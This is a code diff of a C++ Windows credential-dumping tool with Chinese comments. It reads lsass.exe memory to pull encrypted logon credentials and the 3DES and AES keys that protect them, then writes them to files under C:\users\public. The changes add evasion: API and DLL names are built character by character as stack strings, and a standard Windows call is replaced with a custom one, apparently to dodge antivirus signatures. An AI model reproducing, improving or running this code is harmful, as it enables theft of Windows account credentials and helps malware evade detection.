@@ -1,7 +1,11 @@
 #include <Windows.h>
 #include <winternl.h> 
 
-
+inline void MYS_ecureZeroMemory(char* fuck, int number) {
+    for (int i = 0; i < number; i++) {
+        fuck[i] = 0;
+    }
+}
 typedef
 FARPROC
 (NTAPI* PNT_GetProcAddress)(
@@ -212,29 +216,33 @@ inline bool _compare_lsasrv_name(char* dll_name) {
 int main() {
     DWORD64 _kernel32_base_addr = 0;
     DWORD64 _psapi_base_addr = 0;
-    char stack_string[50] = { 0 };
-    HMODULE ahndleeeeer = GetModuleHandleA("kernel32.dll");
+    char stack_string[100];
+    char _dbg_string[100];
+    MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'k'; _dbg_string[1] = 'e'; _dbg_string[2] = 'r'; _dbg_string[3] = 'n'; _dbg_string[4] = 'e'; _dbg_string[5] = 'l'; _dbg_string[6] = '3'; _dbg_string[7] = '2'; _dbg_string[8] = '.'; _dbg_string[9] = 'd'; _dbg_string[10] = 'l'; _dbg_string[11] = 'l';
+    HMODULE ahndleeeeer = GetModuleHandleA(_dbg_string);
     _kernel32_base_addr = reinterpret_cast<DWORD64>(ahndleeeeer);
-    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)GetProcAddress(ahndleeeeer, "LoadLibraryA");
-    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)GetProcAddress(ahndleeeeer, "GetProcAddress");
+    MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'L'; _dbg_string[1] = 'o'; _dbg_string[2] = 'a'; _dbg_string[3] = 'd'; _dbg_string[4] = 'L'; _dbg_string[5] = 'i'; _dbg_string[6] = 'b'; _dbg_string[7] = 'r'; _dbg_string[8] = 'a'; _dbg_string[9] = 'r'; _dbg_string[10] = 'y'; _dbg_string[11] = 'A';
+    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)GetProcAddress(ahndleeeeer, _dbg_string);
+    MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'G'; _dbg_string[1] = 'e'; _dbg_string[2] = 't'; _dbg_string[3] = 'P'; _dbg_string[4] = 'r'; _dbg_string[5] = 'o'; _dbg_string[6] = 'c'; _dbg_string[7] = 'A'; _dbg_string[8] = 'd'; _dbg_string[9] = 'd'; _dbg_string[10] = 'r'; _dbg_string[11] = 'e'; _dbg_string[12] = 's'; _dbg_string[13] = 's';
+    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)GetProcAddress(ahndleeeeer, _dbg_string);
 
     // 从文件中读取数组索引值，获取相关符号的偏移量
 
     // 首先要从kernel32中获取CreateFileA/ReadFile
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'C'; stack_string[1] = 'r'; stack_string[2] = 'e'; stack_string[3] = 'a'; stack_string[4] = 't'; stack_string[5] = 'e'; stack_string[6] = 'F'; stack_string[7] = 'i'; stack_string[8] = 'l'; stack_string[9] = 'e'; stack_string[10] = 'A';
     PNT_CreateFileA NT_CreateFileA = (PNT_CreateFileA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'F'; stack_string[5] = 'i'; stack_string[6] = 'l'; stack_string[7] = 'e';
     PNT_ReadFile NT_ReadFile = (PNT_ReadFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
 
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'C'; stack_string[1] = 'l'; stack_string[2] = 'o'; stack_string[3] = 's'; stack_string[4] = 'e'; stack_string[5] = 'H'; stack_string[6] = 'a'; stack_string[7] = 'n'; stack_string[8] = 'd'; stack_string[9] = 'l'; stack_string[10] = 'e';
     PNT_CloseHandle NT_CloseHandle = (PNT_CloseHandle)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
 
     // 获取文件句柄
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'i'; stack_string[17] = 'l'; stack_string[18] = 'i'; stack_string[19] = '6'; stack_string[20] = 'a'; stack_string[21] = 'o';
     HANDLE hFile = NT_CreateFileA(stack_string,               // file to open
         GENERIC_READ,          // open for reading
@@ -245,7 +253,7 @@ int main() {
         NULL);
     if (INVALID_HANDLE_VALUE == hFile)  return 0;
     // 读取文件
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     DWORD out = 0;
     if (NT_ReadFile(hFile,
         stack_string,
@@ -352,7 +360,7 @@ int main() {
     _3des_aes_len_offset +=
         _return_hex_value(stack_string[8 + 8 + 8 + 8 + 11]);
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'O'; stack_string[1] = 'p'; stack_string[2] = 'e'; stack_string[3] = 'n'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's';
     PNT_OpenProcess NT_OpenProcess = (PNT_OpenProcess)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
     HANDLE _lsass_handle = NT_OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _lsass_pid);
@@ -361,28 +369,28 @@ int main() {
 
     HMODULE lsassDll[1024];
     DWORD bytesReturned;
-    char modName[50] = { 0 };
+    char modName[50] ;
     char* lsass = NULL, * lsasrv = NULL;
 
     // EnumProcessModules和GetModuleFileNameExA需要从psapi.dll中获取
     HMODULE _psapi_module;
     if (!_psapi_base_addr) {
-        SecureZeroMemory(stack_string, 50);
+        MYS_ecureZeroMemory(stack_string, 50);
         stack_string[0] = 'p'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 'p'; stack_string[4] = 'i'; stack_string[5] = '.'; stack_string[6] = 'd'; stack_string[7] = 'l'; stack_string[8] = 'l';
         _psapi_module = NT_LoadLibraryA(stack_string);
     }
     else
         _psapi_module = (HMODULE)_psapi_base_addr;
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'E'; stack_string[1] = 'n'; stack_string[2] = 'u'; stack_string[3] = 'm'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's'; stack_string[11] = 'M'; stack_string[12] = 'o'; stack_string[13] = 'd'; stack_string[14] = 'u'; stack_string[15] = 'l'; stack_string[16] = 'e'; stack_string[17] = 's';
     PNT_EnumProcessModules NT_EnumProcessModules = (PNT_EnumProcessModules)NT_GetProcAddress(_psapi_module, stack_string);
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'M'; stack_string[4] = 'o'; stack_string[5] = 'd'; stack_string[6] = 'u'; stack_string[7] = 'l'; stack_string[8] = 'e'; stack_string[9] = 'F'; stack_string[10] = 'i'; stack_string[11] = 'l'; stack_string[12] = 'e'; stack_string[13] = 'N'; stack_string[14] = 'a'; stack_string[15] = 'm'; stack_string[16] = 'e'; stack_string[17] = 'E'; stack_string[18] = 'x'; stack_string[19] = 'A';
     PNT_GetModuleFileNameExA NT_GetModuleFileNameExA = (PNT_GetModuleFileNameExA)NT_GetProcAddress(_psapi_module, stack_string);
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'W'; stack_string[1] = 'r'; stack_string[2] = 'i'; stack_string[3] = 't'; stack_string[4] = 'e'; stack_string[5] = 'F'; stack_string[6] = 'i'; stack_string[7] = 'l'; stack_string[8] = 'e';
     PNT_WriteFile NT_WriteFile = (PNT_WriteFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
 
@@ -409,7 +417,7 @@ int main() {
             }
             //循环完成后，j就是字符串的实际长度
             BOOL flag = 1;
-            SecureZeroMemory(stack_string, 50);
+            MYS_ecureZeroMemory(stack_string, 50);
             stack_string[0] = 'l'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 's'; stack_string[4] = 's'; stack_string[5] = '.'; stack_string[6] = 'e'; stack_string[7] = 'x'; stack_string[8] = 'e';
             for (int k = 0; k < 9; k++) {
                 if (stack_string[8 - k] != modName[j - 1 - k]) {
@@ -423,7 +431,7 @@ int main() {
             }
 
             flag = 1;
-            SecureZeroMemory(stack_string, 50);
+            MYS_ecureZeroMemory(stack_string, 50);
             stack_string[0] = 'l'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 's'; stack_string[4] = 'r'; stack_string[5] = 'v'; stack_string[6] = '.'; stack_string[7] = 'd'; stack_string[8] = 'l'; stack_string[9] = 'l';
             for (int k = 0; k < 10; k++) {
                 // 需要同时对大小写进行检查
@@ -470,11 +478,11 @@ int main() {
     // 用lsasrv+_logon_session_list_offset+7可得到下一条指令的地址
     // lsasrv+_logon_session_list_offset+3可以得到相对偏移量的地址DWORD
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's'; stack_string[11] = 'M'; stack_string[12] = 'e'; stack_string[13] = 'm'; stack_string[14] = 'o'; stack_string[15] = 'r'; stack_string[16] = 'y';
     PNT_ReadProcessMemory NT_ReadProcessMemory = (PNT_ReadProcessMemory)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
     SIZE_T bytesRead = 0;
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
 #ifdef DEBUG
     printf("%p\n", (void*)(lsasrv + _logon_session_list_offset + 3));
     printf("handle %x\n", _lsass_handle);
@@ -507,7 +515,7 @@ int main() {
         while (1) {
             // 遍历logonsessionlist
             // 取出前8字节，获取到下一个节点的地址，因为第一个是头结点，里面并没有有意义的数据，因此我们在循环体开头就取地址
-            SecureZeroMemory(stack_string, 50);
+            MYS_ecureZeroMemory(stack_string, 50);
             bytesRead = 0;
             NT_ReadProcessMemory(_lsass_handle, (void*)_logon_session_list_addr, (void*)stack_string, 8, &bytesRead);
             DWORD64 _next_node_addr = *(reinterpret_cast<DWORD64*>(stack_string));
@@ -534,7 +542,7 @@ int main() {
             char* _p_credential_addr = _logon_session_list_addr + _credential_offset;
             // 这个地址中保存了credential的地址，因此我们需要取出其中的内容
             // 读取lsass进程内存
-            SecureZeroMemory(stack_string, 50);
+            MYS_ecureZeroMemory(stack_string, 50);
             bytesRead = 0;
 
 #ifdef DEBUG
@@ -551,7 +559,7 @@ int main() {
             // 如果取出的packageid不是3，我们就继续往后遍历
             while (1) {
                 // 获取packageID
-                SecureZeroMemory(stack_string, 50);
+                MYS_ecureZeroMemory(stack_string, 50);
                 if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr + 8), (void*)stack_string, 8, &bytesRead)) {
                     break; continue;
                 }
@@ -563,7 +571,7 @@ int main() {
                 }
                 else {
                     // 往后遍历
-                    SecureZeroMemory(stack_string, 50);
+                    MYS_ecureZeroMemory(stack_string, 50);
                     // 获取下一个节点的地址
                     if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr), (void*)stack_string, 8, &bytesRead)) {
                         break; continue;
@@ -576,7 +584,7 @@ int main() {
 
 
             // 这个地址是一个结构体，+0x10偏移量就是密文的地址
-            SecureZeroMemory(stack_string, 50);
+            MYS_ecureZeroMemory(stack_string, 50);
             bytesRead = 0;
 
 #ifdef DEBUG
@@ -591,7 +599,7 @@ int main() {
             if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_credential_addr + 0x10), (void*)stack_string, 8, &bytesRead))continue;
             DWORD64 _second_level_credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
             // 往后偏移0x10是密文地址，偏移0x1a取出一个word是密文长度
-            SecureZeroMemory(stack_string, 50);
+            MYS_ecureZeroMemory(stack_string, 50);
             bytesRead = 0;
 
 #ifdef DEBUG
@@ -608,23 +616,28 @@ int main() {
 
             char* buffer = (char*)0;
             if (_cipher_length > 0x400) {
-                char _temp_stack[0x500] = { 0 };
+                char _temp_stack[0x500];
+                MYS_ecureZeroMemory(_temp_stack, 0x500);
                 buffer = _temp_stack;
             }
             else if (_cipher_length > 0x300) {
-                char _temp_stack[0x400] = { 0 };
+                char _temp_stack[0x400];
+                MYS_ecureZeroMemory(_temp_stack, 0x400);
                 buffer = _temp_stack;
             }
             else if (_cipher_length > 0x200) {
-                char _temp_stack[0x300] = { 0 };
+                char _temp_stack[0x300];
+                MYS_ecureZeroMemory(_temp_stack, 0x300);
                 buffer = _temp_stack;
             }
             else if (_cipher_length > 0x100) {
-                char _temp_stack[0x200] = { 0 };
+                char _temp_stack[0x200];
+                MYS_ecureZeroMemory(_temp_stack, 0x200);
                 buffer = _temp_stack;
             }
             else {
-                char _temp_stack[0x100] = { 0 };
+                char _temp_stack[0x100];
+                MYS_ecureZeroMemory(_temp_stack, 0x100);
                 buffer = _temp_stack;
             }
             bytesRead = 0;
@@ -644,7 +657,7 @@ int main() {
             // 读取完成后，需要把读取出来的字节写入到文件中
 
             // 首先要写入长度
-            SecureZeroMemory(stack_string, 50);
+            MYS_ecureZeroMemory(stack_string, 50);
             stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'k'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
             hFile = NT_CreateFileA(
                 stack_string,                   // File path
@@ -695,7 +708,7 @@ int main() {
 
         // 从_logon_session_list_ARRAY_addr取出8字节判断是否为0
         _DWORD64_logon_session_list_ARRAY_addr += 0x10;
-        SecureZeroMemory(stack_string, 50);
+        MYS_ecureZeroMemory(stack_string, 50);
         bytesRead = 0;
         NT_ReadProcessMemory(_lsass_handle, (void*)_DWORD64_logon_session_list_ARRAY_addr, (void*)stack_string, 8, &bytesRead);
         DWORD64 _next_link_list_addr = *(reinterpret_cast<DWORD64*>(stack_string));
@@ -709,27 +722,27 @@ int main() {
     // OutputDebugStringA("logon session list iterate done!\n");
     // 之后需要获取3des和aes的key
     bytesRead = 0;
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _3des_key_offset + 3), (void*)stack_string, 4, &bytesRead);
     _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);
     char* _1_3des_addr = lsasrv + _3des_key_offset + 7 + _offset_rip;
     // 取出该地址中的QWORD
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)_1_3des_addr, (void*)stack_string, 8, &bytesRead);
     DWORD64 _2_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_2_3des_addr + 0x10)), (void*)stack_string, 8, &bytesRead);
 
     DWORD64 _3_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));
     // 读取长度
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     // 对于windows7系列，有所不同，长度的位置是0x18而不是0x38
     // 因此我们把这里修改为一个变量，通过前面的计算进行赋值
     NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + _3des_aes_len_offset)), (void*)stack_string, 4, &bytesRead);
     DWORD _3des_len = *(reinterpret_cast<DWORD*>(stack_string));
 
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     // 写入文件
     // 3iaad
     stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = '3'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
@@ -748,7 +761,7 @@ int main() {
         return 1;
     }
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + _3des_aes_len_offset + 4)), (void*)stack_string, _3des_len, &bytesRead);
 
     BYTE byteArray[4];
@@ -784,26 +797,26 @@ int main() {
     // 获取aes key
     // 和上面同样的操作，偏移量什么的都是一样的，只是offset改为_aes_key_offset
     bytesRead = 0;
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _aes_key_offset + 3), (void*)stack_string, 4, &bytesRead);
     _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);
     char* _1_aes_addr = lsasrv + _aes_key_offset + 7 + _offset_rip;
     // 取出该地址中的QWORD
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)_1_aes_addr, (void*)stack_string, 8, &bytesRead);
     DWORD64 _2_aes_addr = *(reinterpret_cast<DWORD64*>(stack_string));
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_2_aes_addr + 0x10)), (void*)stack_string, 8, &bytesRead);
 
     DWORD64 _3_aes_addr = *(reinterpret_cast<DWORD64*>(stack_string));
     // 读取长度
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + _3des_aes_len_offset)), (void*)stack_string, 4, &bytesRead);
     DWORD _aes_len = *(reinterpret_cast<DWORD*>(stack_string));
 
 
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     // 写入文件
     // aiaad
     stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'a'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
@@ -822,7 +835,7 @@ int main() {
         return 1;
     }
 
-    SecureZeroMemory(stack_string, 50);
+    MYS_ecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + _3des_aes_len_offset + 4)), (void*)stack_string, _aes_len, &bytesRead);
     // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
     byteArray[0] = (BYTE)(_aes_len & 0xFF);         // Low byte
